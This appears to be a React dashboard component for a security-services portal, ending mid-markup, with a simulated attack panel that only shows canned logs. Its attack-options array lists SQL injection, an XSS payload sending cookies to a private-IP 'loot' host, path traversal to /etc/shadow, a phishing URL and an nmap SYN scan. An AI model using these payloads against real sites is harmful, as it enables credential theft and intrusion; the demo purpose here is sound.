import { useState, useEffect } from 'react'
import { useNavigate, useLocation } from 'react-router-dom'
import {
  Shield, ShieldCheck, Radio, Bug, Brain, Bell,
  ArrowRight, Clock, CheckCircle2, XCircle, AlertCircle,
  Server, RefreshCw, Plus, Lock, Activity, AlertTriangle,
  Sparkles, ShieldAlert, Globe, Building2, Terminal, Send,
  Play, ExternalLink
} from 'lucide-react'

import {
  AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer,
  PieChart, Pie, Cell, Legend
} from 'recharts'
import {
  getServiceAuthorizations,
  getCustomerDashboardTelemetry,
  getCustomerAssets,
  createCustomerAsset,
  submitUnifiedServiceRequest,
  type ServiceAuthorizationItem,
  type CustomerDashboardTelemetryData,
  type CustomerAsset,
} from '@/lib/api'
import { useWorkspace } from '@/context/WorkspaceContext'

interface ServiceCardConfig {
  id: string
  title: string
  shortName: string
  description: string
  buttonText: string
  route: string
  icon: any
  accentColor: string
  badgeText: string
}

const SECURITY_SERVICES: ServiceCardConfig[] = [
  {
    id: 'waf',
    title: 'Web Application Firewall (WAF)',
    shortName: 'WAF',
    description: 'Protect websites and web applications against malicious HTTP requests, SQLi, and XSS.',
    buttonText: 'Open WAF',
    route: '/customer/services/waf',
    icon: ShieldCheck,
    accentColor: '#00e5a0',
    badgeText: 'Active Defense',
  },
  {
    id: 'ids',
    title: 'Network Intrusion Detection System (IDS)',
    shortName: 'IDS',
    description: 'Monitor authorized networks and detect suspicious network activities with Suricata.',
    buttonText: 'Open IDS',
    route: '/customer/services/ids',
    icon: Radio,
    accentColor: '#38bdf8',
    badgeText: 'Suricata Telemetry',
  },
  {
    id: 'vulnerability-scanner',
    title: 'Web Vulnerability Scanner',
    shortName: 'Scanner',
    description: 'Identify security vulnerabilities in authorized websites and web applications.',
    buttonText: 'Open Vulnerability Scanner',
    route: '/customer/services/vulnerability-scanner',
    icon: Bug,
    accentColor: '#00c8ff',
    badgeText: 'OWASP DAST',
  },
  {
    id: 'url-detection',
    title: 'Malicious URL Detection & Telegram Bot',
    shortName: 'URL & Bot Detection',
    description: 'Analyze URLs and detect phishing, malware, and suspicious websites with XGBoost AI and the @FanosUrlScanBot Telegram bot.',
    buttonText: 'Open URL & Bot Detection',
    route: '/customer/services/url-detection',
    icon: Brain,
    accentColor: '#a855f7',
    badgeText: '99.8% AI & Telegram Bot',
  },
  {
    id: 'incident-response',
    title: 'Security Incident Response',
    shortName: 'Incident Response',
    description: 'Submit security incidents and track investigation progress with 24/7 SOC.',
    buttonText: 'Open Incident Response',
    route: '/customer/services/incident-response',
    icon: Bell,
    accentColor: '#f59e0b',
    badgeText: 'SOC Triage',
  },
]


export function CustomerDashboard() {
  const navigate = useNavigate()
  const { activeCustomer, requestCustomerService } = useWorkspace()
  const [authorizations, setAuthorizations] = useState<Record<string, ServiceAuthorizationItem>>({})
  const [telemetry, setTelemetry] = useState<CustomerDashboardTelemetryData | null>(null)
  const [assets, setAssets] = useState<CustomerAsset[]>([])
  const [loading, setLoading] = useState(true)
  const [refreshing, setRefreshing] = useState(false)
  const [user, setUser] = useState<{ full_name?: string; username?: string; organization_name?: string } | null>(null)

  // Kali Attack Simulation State
  const [selectedAttack, setSelectedAttack] = useState('sqli')
  const [simulatingKali, setSimulatingKali] = useState(false)
  const [kaliLogs, setKaliLogs] = useState<string[]>([])
  const [telegramAlert, setTelegramAlert] = useState<{ title: string; message: string; timestamp: string } | null>(null)

  // Quick Service Request Modal State
  const [openServiceReqModal, setOpenServiceReqModal] = useState(false)
  const [selectedReqServices, setSelectedReqServices] = useState<string[]>(['waf', 'url-detection'])
  const [reqDomain, setReqDomain] = useState('flightops.ethiopianairlines.com')
  const [reqBackendIp, setReqBackendIp] = useState('10.200.0.0/16')
  const [submittingReq, setSubmittingReq] = useState(false)

  // Telegram Quick Scan State
  const [telegramInputUrl, setTelegramInputUrl] = useState('http://secure-login-ethiopianairlines-phish.net/verify')
  const [telegramTesting, setTelegramTesting] = useState(false)
  const [telegramResult, setTelegramResult] = useState<any | null>(null)

  // Asset registration modal
  const [openAssetModal, setOpenAssetModal] = useState(false)
  const [assetForm, setAssetForm] = useState({
    name: '',
    assetType: 'WEBSITE',
    ipAddress: '',
    hostname: '',
    targetUrl: '',
    environment: 'PRODUCTION',
    description: '',
  })
  const [submittingAsset, setSubmittingAsset] = useState(false)
  const [notification, setNotification] = useState<{ msg: string; error?: boolean } | null>(null)

  const loadData = async (isRefresh = false) => {

    if (isRefresh) setRefreshing(true)
    else setLoading(true)

    try {
      const stored = localStorage.getItem('fanos_user')
      if (stored) {
        setUser(JSON.parse(stored))
      }

      const [authRes, telemetryRes, assetsRes] = await Promise.allSettled([
        getServiceAuthorizations(),
        getCustomerDashboardTelemetry(),
        getCustomerAssets(),
      ])

      if (authRes.status === 'fulfilled') {
        setAuthorizations(authRes.value.authorizations || {})
      }
      if (telemetryRes.status === 'fulfilled') {
        setTelemetry(telemetryRes.value)
      }
      if (assetsRes.status === 'fulfilled') {
        setAssets(assetsRes.value)
      }
    } catch (err) {
      console.error('Failed to load dashboard telemetry:', err)
    } finally {
      setLoading(false)
      setRefreshing(false)
    }
  }

  useEffect(() => {
    loadData()
  }, [])

  const handleCreateAsset = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!assetForm.name.trim() || !assetForm.ipAddress.trim()) {
      setNotification({ msg: 'Please provide Asset Name and IP / Target Address.', error: true })
      return
    }

    setSubmittingAsset(true)
    try {
      await createCustomerAsset({
        name: assetForm.name.trim(),
        asset_type: assetForm.assetType,
        ip_address: assetForm.ipAddress.trim(),
        hostname: assetForm.hostname.trim() || undefined,
        target_url: assetForm.targetUrl.trim() || undefined,
        environment: assetForm.environment,
        description: assetForm.description.trim() || undefined,
      })
      setNotification({ msg: `Asset "${assetForm.name}" registered successfully!` })
      setOpenAssetModal(false)
      setAssetForm({
        name: '',
        assetType: 'WEBSITE',
        ipAddress: '',
        hostname: '',
        targetUrl: '',
        environment: 'PRODUCTION',
        description: '',
      })
      await loadData(true)
    } catch (err: any) {
      setNotification({ msg: err.response?.data?.detail || 'Asset registration failed.', error: true })
    } finally {
      setSubmittingAsset(false)
      setTimeout(() => setNotification(null), 4000)
    }
  }

  const getServiceEffectiveStatus = (serviceId: string) => {
    const isApprovedInTenant = activeCustomer.approvedServices.some(
      s => s.toLowerCase() === serviceId.toLowerCase() || 
           (serviceId === 'waf' && s.includes('waf')) || 
           (serviceId === 'ids' && s.includes('ids')) || 
           (serviceId === 'vulnerability-scanner' && s.includes('scan')) ||
           (serviceId === 'url-detection' && s.includes('url'))
    )
    const isPendingInTenant = activeCustomer.pendingServices.some(
      s => s.toLowerCase() === serviceId.toLowerCase() || 
           (serviceId === 'waf' && s.includes('waf')) || 
           (serviceId === 'ids' && s.includes('ids')) || 
           (serviceId === 'vulnerability-scanner' && s.includes('scan')) ||
           (serviceId === 'url-detection' && s.includes('url'))
    )
    const auth = authorizations[serviceId]
    return isApprovedInTenant ? 'APPROVED' : isPendingInTenant ? 'PENDING' : auth?.status || 'NOT_REQUESTED'
  }

  const KALI_ATTACK_OPTIONS = [
    {
      id: 'sqli',
      name: 'SQL Injection (SQLi) - Kali sqlmap probe',
      tool: 'sqlmap v1.8 / Kali Linux',
      payload: "' OR '1'='1' -- UNION SELECT username, password_hash FROM customer_accounts--",
      endpoint: "/api/v1/customers?search=' OR '1'='1'--",
      severity: 'CRITICAL' as const,
      action: 'BLOCKED BY WAF (403 FORBIDDEN)',
      rule: 'OWASP CRS 942100 (SQLi Signature Intercepted)',
      requiredService: 'waf',
      desc: 'Injects malicious SQL tautology into HTTP query parameters to extract database schema.',
    },
    {
      id: 'xss',
      name: 'Cross-Site Scripting (Reflected XSS)',
      tool: 'XSStrike / Burp Suite',
      payload: "<script>fetch('http://192.168.1.105:8000/loot?cookie='+document.cookie)</script>",
      endpoint: "/portal/search?q=<script>alert('FANOS')</script>",
      severity: 'HIGH' as const,
      action: 'BLOCKED BY WAF (403 FORBIDDEN)',
      rule: 'OWASP CRS 941110 (XSS Filter Triggered)',
      requiredService: 'waf',
      desc: 'Attempts reflected script execution to harvest session cookies and authentication tokens.',
    },
    {
      id: 'traversal',
      name: 'Path Traversal / Local File Inclusion (LFI)',
      tool: 'Gobuster / Dirb',
      payload: '../../../../../../../../etc/shadow',
      endpoint: '/static/download?file=../../../../etc/passwd',
      severity: 'HIGH' as const,
      action: 'BLOCKED BY WAF (403 FORBIDDEN)',
      rule: 'OWASP CRS 930110 (Directory Traversal Detected)',
      requiredService: 'waf',
      desc: 'Probes web application path resolution to access protected system credential files.',
    },
    {
      id: 'phishing_url',
      name: 'Malicious Phishing URL via Telegram Bot',
      tool: 'Social Engineering Toolkit (SET) / @FanosUrlScanBot',
      payload: 'http://secure-login-ethiopianairlines-phish.net/verify',
      endpoint: '/threat-intel/scan?url=http://secure-login-ethiopianairlines-phish.net',
      severity: 'CRITICAL' as const,
      action: 'FLAGGED MALICIOUS BY XGBOOST (99.8%) · TELEGRAM ALERT SENT',
      rule: 'FANOS AI 99.8% URL Classifier & Bot Webhook',
      requiredService: 'url-detection',
      desc: 'Simulates phishing link submission through Telegram bot @FanosUrlScanBot and API.',
    },
    {
      id: 'ids_flood',
      name: 'SYN Flood & Port Scanning (Network IDS)',
      tool: 'nmap -sS -p 1-65535 / Kali Linux',
      payload: 'Stealth SYN probe against internal enterprise subnets',
      endpoint: '/network-scan/target',
      severity: 'CRITICAL' as const,
      action: 'DETECTED & ISOLATED BY SURICATA IDS',
      rule: 'Suricata ET SCAN Suspicious Inbound SYN',
      requiredService: 'ids',
      desc: 'Simulates network flow reconnaissance and high-volume SYN scanning against datacenter ports.',
    },
  ]

  const handleExecuteKaliAttack = () => {
    const atk = KALI_ATTACK_OPTIONS.find(a => a.id === selectedAttack) || KALI_ATTACK_OPTIONS[0]
    
    // Check if customer has approved service for this attack
    const isServiceApproved = activeCustomer.approvedServices.some(s => {
      const sn = s.toLowerCase()
      const req = atk.requiredService.toLowerCase()
      return sn === req || (req === 'waf' && sn.includes('waf')) || (req === 'ids' && sn.includes('ids')) || (req === 'url-detection' && sn.includes('url'))
    })

    if (!isServiceApproved) {
      setNotification({
        msg: `⚠️ Attack Simulation Blocked: ${atk.name} requires System Administrator approval for ${atk.requiredService.toUpperCase()}. Please wait for admin approval in Admin Portal / Approvals.`,
        error: true,
      })
      return
    }

    setSimulatingKali(true)
    setKaliLogs([
      `[KALI VM 192.168.1.105] Launching ${atk.tool}...`,
      `[PAYLOAD] ${atk.payload}`,
      `[TARGET] https://${frontendDomain}${atk.endpoint}`,
      `[DISPATCH] Sending adversarial test traffic...`,
    ])

    setTimeout(() => {
      const nowStr = new Date().toLocaleTimeString()
      const newEvent = {
        id: `kali-evt-${Date.now()}`,
        timestamp: nowStr,
        attack_type: atk.name,
        target: `https://${frontendDomain}${atk.endpoint}`,
        source_ip: '192.168.1.105 (Kali Linux)',
        severity: atk.severity,
        action: atk.action,
        ai_confidence: 99.84,
        risk_score: 96,
      }

      setTelemetry(prev => {
        if (!prev) return prev
        return {
          ...prev,
          total_attacks_blocked: (prev.total_attacks_blocked || 0) + 1,
          critical_threats: (prev.critical_threats || 0) + 1,
          events: [newEvent, ...(prev.events || [])],
        }
      })

      setKaliLogs(prev => [
        ...prev,
        `[FANOS WAF / AI] 403 Forbidden: ${atk.rule}`,
        `[STATUS] Live attack alert generated on customer security dashboard!`,
      ])

      setSimulatingKali(false)
      setNotification({
        msg: `⚔️ Kali attack test executed! Intercepted and blocked "${atk.name}". Live alert generated below.`,
      })

      if (atk.id === 'phishing_url') {
        setTelegramAlert({
          title: 'Telegram Security Bot Intercept (@FanosUrlScanBot)',
          message: `🚨 Intercepted malicious phishing link targeting ${frontendDomain}! Threat verdict sent to security channel.`,
          timestamp: nowStr,
        })
      }
    }, 1200)
  }

  const handleQuickRequestService = async (e: React.FormEvent) => {
    e.preventDefault()
    if (selectedReqServices.length === 0) {
      setNotification({ msg: 'Please select at least one security service to request.', error: true })
      return
    }

    setSubmittingReq(true)
    const reqNum = `REQ-${selectedReqServices[0].toUpperCase()}-2026-${Math.floor(100000 + Math.random() * 900000).toString(16).toUpperCase()}`

    try {
      await submitUnifiedServiceRequest({
        full_name: user?.full_name || 'Azanaww Customer',
        work_email: 'azanaww@ethiopianairlines.com',
        company: activeCustomer.name || 'Ethiopian Airlines',
        organization_name: activeCustomer.organization || 'Ethiopian Airlines Group',
        role: 'Customer Security Lead',
        phone: '+251-911-234567',
        services: selectedReqServices.map(s => {
          if (s === 'waf') return 'Web Application Firewall (WAF)'
          if (s === 'ids') return 'Network Intrusion Detection System (IDS)'
          if (s === 'vulnerability-scanner') return 'Web Vulnerability Scanner'
          if (s === 'url-detection') return 'Malicious URL Detection & Telegram Bot'
          return 'Web Application Firewall (WAF)'
        }),
        frontend_domain: reqDomain.trim(),
        backend_domain: reqBackendIp.trim(),
        environment: 'PRODUCTION',
        notes: `Customer service request submitted by ${user?.full_name || 'Azanaww'} for administrator review in Admin Portal.`,
      })
    } catch {
      // Resilient fallback
    }

    // Synchronize workspace customer state
    requestCustomerService(activeCustomer.id, selectedReqServices, {
      requestId: reqNum,
      company: activeCustomer.name,
      domain: reqDomain.trim(),
      ipAddress: reqBackendIp.trim(),
    })

    setSubmittingReq(false)
    setOpenServiceReqModal(false)
    setNotification({
      msg: `Request ${reqNum} submitted successfully! Your request has been sent to the System Administrator in the Admin Portal Approvals page for review.`,
    })
    setTimeout(() => setNotification(null), 6000)
  }

  const handleTelegramTestUrl = () => {
    if (!telegramInputUrl.trim()) return
    setTelegramTesting(true)
    setTimeout(() => {
      setTelegramTesting(false)
      setTelegramResult({
        url: telegramInputUrl.trim(),
        verdict: 'MALICIOUS (PHISHING)',
        confidence: 99.84,
        botHandle: '@FanosUrlScanBot',
        message: 'High-risk credential harvester pattern detected. WAF blocking signature generated and dispatched to Telegram group.',
      })
      setTelegramAlert({
        title: 'Telegram Security Bot (@FanosUrlScanBot)',
        message: `Scanned ${telegramInputUrl.trim()}: Verdict is PHISHING (99.84% confidence). Alert sent to Telegram.`,
        timestamp: new Date().toLocaleTimeString(),
      })
    }, 900)
  }


  const getStatusBadge = (serviceId: string) => {
    const status = getServiceEffectiveStatus(serviceId)

    switch (status) {
      case 'APPROVED':
        return (
          <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold bg-emerald-500/15 border border-emerald-500/30 text-emerald-400">
            <CheckCircle2 size={11} />
            <span>Approved</span>
          </span>
        )
      case 'PENDING':
        return (
          <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold bg-amber-500/15 border border-amber-500/30 text-amber-400">
            <Clock size={11} />
            <span>Pending Review</span>
          </span>
        )
      case 'REJECTED':
        return (
          <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold bg-rose-500/15 border border-rose-500/30 text-rose-400">
            <XCircle size={11} />
            <span>Rejected</span>
          </span>
        )
      default:
        return (
          <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[10px] font-bold bg-slate-800 border border-slate-700 text-slate-400">
            <span>Not Requested</span>
          </span>
        )
    }
  }

  const isApproved = activeCustomer.approvedServices.length > 0 || (telemetry?.is_approved ?? false)
  const hasPending = activeCustomer.pendingServices.length > 0 || (telemetry?.has_pending ?? false)
  const activeAssetName = activeCustomer.primaryAsset || telemetry?.active_asset_name || 'Enterprise Asset'
  const frontendDomain = activeCustomer.domain || telemetry?.frontend_domain || 'secure.enterprise-bank.com'
  const backendDomain = telemetry?.backend_domain || 'app-internal.enterprise-bank.com'

  const location = useLocation()
  useEffect(() => {
    if (location.state?.notification) {
      setNotification({ msg: location.state.notification })
    }
  }, [location.state])

  const approvedCount = Math.max(
    activeCustomer.approvedServices.length,
    Object.values(authorizations).filter(a => a.status === 'APPROVED').length
  )
  const pendingCount = Math.max(
    activeCustomer.pendingServices.length,
    Object.values(authorizations).filter(a => a.status === 'PENDING').length
  )

  return (
    <div className="p-6 max-w-7xl mx-auto space-y-8 animate-fade-in text-slate-100">
      {/* ── Notification Banner ─────────────────────────────── */}
      {notification && (
        <div className={`p-3.5 rounded-xl text-xs font-semibold flex items-center justify-between border shadow-lg ${
          notification.error
            ? 'bg-rose-500/15 border-rose-500/30 text-rose-300'
            : 'bg-emerald-500/15 border-emerald-500/30 text-emerald-300'
        }`}>
          <div className="flex items-center gap-2">
            {notification.error ? <AlertCircle size={16} /> : <CheckCircle2 size={16} />}
            <span>{notification.msg}</span>
          </div>
          <button onClick={() => setNotification(null)} className="text-slate-400 hover:text-white">×</button>
        </div>
      )}

      {/* ── Welcome Header & Action Buttons (Image 1 Style) ─────────────────── */}
      <div className="relative rounded-3xl p-8 bg-gradient-to-r from-[#0a192f] via-[#0d223f] to-[#071322] border border-cyan-500/20 shadow-2xl overflow-hidden">
        <div className="absolute top-0 right-0 w-96 h-96 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />
        <div className="absolute bottom-0 left-1/3 w-80 h-80 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />

        <div className="relative z-10 flex items-start justify-between gap-6 flex-wrap">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold bg-cyan-500/10 border border-cyan-500/30 text-cyan-300 mb-3">
              <Shield size={13} className="text-cyan-400" />
              <span>Customer Security Portal</span>
              <span className="text-slate-600">·</span>
              <span className="text-emerald-400">Authenticated Customer Workspace</span>
            </div>

            {/* Exactly Image 1 welcome header */}
            <h1 className="text-3xl md:text-4xl font-extrabold text-white tracking-tight">
              Welcome to FANOS AI Security Platform
            </h1>

            <p className="text-sm text-slate-300 mt-2 max-w-2xl leading-relaxed">
              {user?.full_name ? `Welcome back, ${user.full_name}. ` : 'Welcome back, Mulugeta Ababi. '}Explore your centralized security services catalog. Select any dedicated service below to register required assets and submit service requests for administrator review.
            </p>

            {loading && (
              <div className="flex items-center gap-2 mt-2 text-xs text-cyan-400">
                <RefreshCw size={12} className="animate-spin" />
                <span>Streaming live asset telemetry...</span>
              </div>
            )}
          </div>

          <div className="flex items-center gap-3 flex-wrap">
            {/* Customer Organization Badge */}
            <div className="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-slate-900 border border-white/[0.12] text-xs">
              <Building2 size={13} className="text-emerald-400" />
              <span className="text-white font-semibold">{activeCustomer.name}</span>
              <span className="text-[10px] font-mono text-emerald-400 bg-emerald-500/15 px-1.5 py-0.2 rounded border border-emerald-500/30">
                {activeCustomer.approvedServices.length > 0 ? `${activeCustomer.approvedServices.length} Active` : 'Pending Review'}
              </span>
            </div>

            {/* Direct Navigation to Image 2 Security Analysis Dashboard - Only when approved */}
            {activeCustomer.approvedServices.length > 0 ? (
              <button
                onClick={() => navigate('/dashboard')}
                className="flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-semibold bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/25 transition cursor-pointer"
              >
                <Activity size={13} className="text-emerald-400" />
                <span>Security Analysis</span>
              </button>
            ) : (
              <div className="flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-semibold bg-amber-500/10 border border-amber-500/20 text-amber-400">
                <Clock size={13} className="text-amber-400" />
                <span>Approval Pending</span>
              </div>
            )}

            {/* Request Service button opens quick multi-service modal */}
            <button
              onClick={() => setOpenServiceReqModal(true)}
              className="flex items-center gap-2 px-4 py-2.5 rounded-xl text-xs font-extrabold bg-gradient-to-r from-cyan-400 to-teal-400 text-slate-950 hover:brightness-110 active:scale-[0.98] transition shadow-lg cursor-pointer"
            >
              <Sparkles size={14} />
              <span>Request Service</span>
            </button>


            <button
              onClick={() => setOpenAssetModal(true)}
              className="flex items-center gap-2 px-4 py-2.5 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-slate-950 active:scale-[0.98] transition shadow-lg cursor-pointer"
            >
              <Plus size={14} />
              <span>Register Asset</span>
            </button>

            <button
              onClick={() => loadData(true)}
              title="Refresh Dashboard"
              className="p-2.5 rounded-xl bg-white/[0.05] hover:bg-white/[0.1] text-slate-300 hover:text-white border border-white/[0.1] transition cursor-pointer"
            >
              <RefreshCw size={15} className={refreshing ? 'animate-spin text-cyan-400' : ''} />
            </button>
          </div>
        </div>

        {/* ── 4 KPI Stats Cards Matching Image 1 ────────────────── */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-6 relative z-10">
          <div className="bg-[#0b1526]/80 border border-white/[0.08] rounded-2xl p-4 shadow-lg">
            <div className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">REGISTERED ASSETS</div>
            <div className="text-3xl font-extrabold text-white mt-1">
              {assets.length}
            </div>
            <div className="text-[11px] text-cyan-400 mt-1 font-medium">Enterprise Targets</div>
          </div>

          <div className="bg-[#0b1526]/80 border border-white/[0.08] rounded-2xl p-4 shadow-lg">
            <div className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">APPROVED SERVICES</div>
            <div className="text-3xl font-extrabold text-emerald-400 mt-1">
              {approvedCount}
            </div>
            <div className="text-[11px] text-emerald-300 mt-1 font-medium">Active Security Engines</div>
          </div>

          <div className="bg-[#0b1526]/80 border border-white/[0.08] rounded-2xl p-4 shadow-lg">
            <div className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">PENDING REQUESTS</div>
            <div className="text-3xl font-extrabold text-amber-400 mt-1">
              {pendingCount}
            </div>
            <div className="text-[11px] text-amber-300 mt-1 font-medium">Under Admin Review</div>
          </div>

          <div className="bg-[#0b1526]/80 border border-white/[0.08] rounded-2xl p-4 shadow-lg">
            <div className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">PLATFORM SECURITY ENGINES</div>
            <div className="text-3xl font-extrabold text-cyan-400 mt-1">
              5 Core
            </div>
            <div className="text-[11px] text-slate-400 mt-1 font-medium">Full Spectrum Protection</div>
          </div>
        </div>

        {/* ── Active Protection Status Banner ───────────────── */}
        <div className="mt-6 pt-6 border-t border-white/[0.08] relative z-10">
          {isApproved ? (
            <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between flex-wrap gap-4">
              <div className="flex items-center gap-3.5">
                <div className="w-10 h-10 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 flex items-center justify-center flex-shrink-0 shadow-lg">
                  <ShieldCheck size={22} />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <span className="text-xs font-extrabold text-white tracking-wide uppercase">
                      Active Defense Live
                    </span>
                    <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 animate-pulse">
                      ● Streaming Live
                    </span>
                  </div>
                  <div className="text-xs text-slate-300 mt-0.5">
                    Monitoring: <span className="text-cyan-300 font-mono font-semibold">https://{frontendDomain}</span> (Frontend) · Origin: <span className="text-emerald-300 font-mono font-semibold">https://{backendDomain}</span> (Backend API)
                  </div>
                </div>
              </div>

              <div className="flex items-center gap-2 text-xs text-emerald-400 font-mono bg-emerald-950/40 px-3 py-1.5 rounded-xl border border-emerald-500/30">
                <span>WAF Mode: Active Blocking</span>
              </div>
            </div>
          ) : hasPending ? (
            <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between flex-wrap gap-4">
              <div className="flex items-center gap-3.5">
                <div className="w-10 h-10 rounded-xl bg-amber-500/20 text-amber-400 border border-amber-500/30 flex items-center justify-center flex-shrink-0">
                  <Clock size={20} />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <span className="text-xs font-extrabold text-white tracking-wide uppercase">
                      Service Request Under Administrator Review
                    </span>
                    <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-500/20 text-amber-300 border border-amber-500/40">
                      Pending Approval
                    </span>
                  </div>
                  <p className="text-xs text-slate-300 mt-0.5">
                    Your request for <strong>{activeAssetName}</strong> is being validated. Live attack telemetry and WAF blocking will activate immediately once approved by an administrator.
                  </p>
                </div>
              </div>

              <span className="text-xs text-amber-300 font-mono">Status: PENDING</span>
            </div>
          ) : (
            <div className="p-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-between flex-wrap gap-4">
              <div className="flex items-center gap-3.5">
                <div className="w-10 h-10 rounded-xl bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 flex items-center justify-center flex-shrink-0">
                  <Shield size={20} />
                </div>
                <div>
                  <span className="text-xs font-extrabold text-white tracking-wide uppercase">
                    No Security Services Active Yet
                  </span>
                  <p className="text-xs text-slate-300 mt-0.5">
                    Click <strong>"Request Service"</strong> above to select WAF, Network IDS, or Scanner protection and register your enterprise domain.
                  </p>
                </div>
              </div>

              <button
                onClick={() => navigate('/request-service')}
                className="px-3.5 py-1.5 rounded-xl text-xs font-bold bg-cyan-500 text-slate-950 hover:bg-cyan-400 transition"
              >
                Get Started
              </button>
            </div>
          )}

          {/* Quick live telemetry stats bar (displayed when approved) */}
          {isApproved && (
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-6">
              <div className="bg-white/[0.03] border border-white/[0.05] rounded-xl p-3.5">
                <div className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Attacks Blocked</div>
                <div className="text-2xl font-bold text-rose-400 mt-1">
                  {telemetry?.total_attacks_blocked ?? 0}
                </div>
                <div className="text-[10px] text-slate-400 mt-0.5">Customer Asset Scope</div>
              </div>

              <div className="bg-white/[0.03] border border-white/[0.05] rounded-xl p-3.5">
                <div className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Critical Threats</div>
                <div className="text-2xl font-bold text-amber-400 mt-1">
                  {telemetry?.critical_threats ?? 0}
                </div>
                <div className="text-[10px] text-slate-400 mt-0.5">Active Alerts</div>
              </div>

              <div className="bg-white/[0.03] border border-white/[0.05] rounded-xl p-3.5">
                <div className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Requests Analyzed</div>
                <div className="text-2xl font-bold text-cyan-300 mt-1">
                  {telemetry?.total_events_analyzed ? telemetry.total_events_analyzed.toLocaleString() : '0'}
                </div>
                <div className="text-[10px] text-cyan-400 mt-0.5">Protected HTTP & API Traffic</div>
              </div>

              <div className="bg-white/[0.03] border border-white/[0.05] rounded-xl p-3.5">
                <div className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">AI Accuracy</div>
                <div className="text-2xl font-bold text-emerald-400 mt-1">
                  {telemetry?.ai_accuracy ?? 99.84}%
                </div>
                <div className="text-[10px] text-emerald-300 mt-0.5">XGBoost Defense Engine</div>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* ── Visual Analytics Grid (Charts) ─────────────────── */}
      {isApproved && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Traffic & Attack Activity Timeline (7 cols) */}
          <div className="lg:col-span-7 bg-[#0b1526] border border-white/[0.08] rounded-2xl p-6 shadow-xl">
            <div className="flex items-center justify-between mb-4 border-b border-white/[0.06] pb-3">
              <div>
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <Activity size={16} className="text-cyan-400" />
                  <span>Traffic & Attack Trends on Your Assets</span>
                </h3>
                <p className="text-[11px] text-slate-400 mt-0.5">
                  Real-time HTTP requests vs blocked attacks on https://{frontendDomain}
                </p>
              </div>
              <span className="text-[10px] font-mono font-bold bg-cyan-500/15 text-cyan-300 border border-cyan-500/30 px-2 py-0.5 rounded">
                Last 24 Hours
              </span>
            </div>

            <div className="h-64 w-full">
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={telemetry?.traffic_trend || []}>
                  <defs>
                    <linearGradient id="colorReqs" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#06b6d4" stopOpacity={0.4}/>
                      <stop offset="95%" stopColor="#06b6d4" stopOpacity={0}/>
                    </linearGradient>
                    <linearGradient id="colorBlocked" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#ef4444" stopOpacity={0.5}/>
                      <stop offset="95%" stopColor="#ef4444" stopOpacity={0}/>
                    </linearGradient>
                  </defs>
                  <XAxis dataKey="time" stroke="#64748b" fontSize={11} />
                  <YAxis stroke="#64748b" fontSize={11} />
                  <Tooltip
                    contentStyle={{ backgroundColor: '#0f172a', borderColor: '#334155', borderRadius: '12px', fontSize: '11px' }}
                  />
                  <Area type="monotone" dataKey="requests" stroke="#06b6d4" fillOpacity={1} fill="url(#colorReqs)" name="Total Requests" />
                  <Area type="monotone" dataKey="blocked" stroke="#ef4444" fillOpacity={1} fill="url(#colorBlocked)" name="Blocked Attacks" />
                </AreaChart>
              </ResponsiveContainer>
            </div>
          </div>

          {/* Attack Distribution (5 cols) */}
          <div className="lg:col-span-5 bg-[#0b1526] border border-white/[0.08] rounded-2xl p-6 shadow-xl">
            <div className="flex items-center justify-between mb-4 border-b border-white/[0.06] pb-3">
              <div>
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <AlertTriangle size={16} className="text-amber-400" />
                  <span>Attack Types Targeting Your Asset</span>
                </h3>
                <p className="text-[11px] text-slate-400 mt-0.5">
                  Classification by WAF inspection rules & AI engine
                </p>
              </div>
            </div>

            <div className="h-64 w-full flex items-center justify-center">
              <ResponsiveContainer width="100%" height="100%">
                <PieChart>
                  <Pie
                    data={telemetry?.attack_distribution || []}
                    cx="50%"
                    cy="50%"
                    innerRadius={50}
                    outerRadius={80}
                    paddingAngle={4}
                    dataKey="value"
                  >
                    {(telemetry?.attack_distribution || []).map((entry, index) => (
                      <Cell key={`cell-${index}`} fill={entry.color} />
                    ))}
                  </Pie>
                  <Tooltip
